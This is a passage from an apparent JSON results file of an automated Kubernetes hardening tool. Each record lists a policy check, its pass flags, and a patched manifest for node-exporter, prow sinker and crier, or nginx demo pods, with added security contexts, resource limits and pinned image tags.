    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "errors": []
  },
  {
    "id": "01640",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "errors": []
  },
  {
    "id": "01641",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "errors": []
  },
  {
    "id": "01642",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "errors": []
  },
  {
    "id": "01643",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  selector:\n    matchLabels:\n      app: sinker\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        image: gcr.io/k8s-prow/sinker:v20211206-64485af39f\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01644",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  selector:\n    matchLabels:\n      app: sinker\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        image: gcr.io/k8s-prow/sinker:v20211206-64485af39f\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01645",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  selector:\n    matchLabels:\n      app: sinker\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        image: gcr.io/k8s-prow/sinker:v20211206-64485af39f\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01646",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  selector:\n    matchLabels:\n      app: sinker\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        image: gcr.io/k8s-prow/sinker:v20211206-64485af39f\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01647",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01648",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01649",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01650",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01651",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01652",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx:stable\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "errors": []
  },
  {
    "id": "01653",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx:stable\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "errors": []
  },
  {
    "id": "01654",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx:stable\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "errors": []
  },
  {
    "id": "01655",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx:stable\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "errors": []
  },
  {
    "id": "01656",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx:stable\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "errors": []
  },
  {
    "id": "01657",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20201001-0240871903\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "errors": []
  },
  {
    "id": "01658",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20201001-0240871903\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "errors": []
  },
  {
    "id": "01659",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20201001-0240871903\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "errors": []
  },
  {
    "id": "01660",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20201001-0240871903\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "errors": []
  },
  {
    "id": "01661",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01662",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
